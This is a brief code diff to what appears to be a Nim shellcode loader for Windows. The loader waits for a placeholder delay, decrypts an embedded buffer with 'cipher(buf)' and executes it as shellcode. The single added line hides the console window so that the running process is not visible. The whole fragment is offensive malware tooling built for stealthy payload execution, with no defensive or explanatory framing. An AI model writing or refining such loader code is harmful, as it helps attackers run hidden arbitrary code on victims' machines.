@@ -26,6 +26,7 @@ proc Execute(shellcode: openarray[byte]):void =
 
 when defined(windows):
     when isMainModule:
+        ShowWindow(GetConsoleWindow(), SW_HIDE)
         Sleep(SLEEP_PLACEHOLDER * 1000)
         var shellcode = cipher(buf)
         Execute(shellcode)
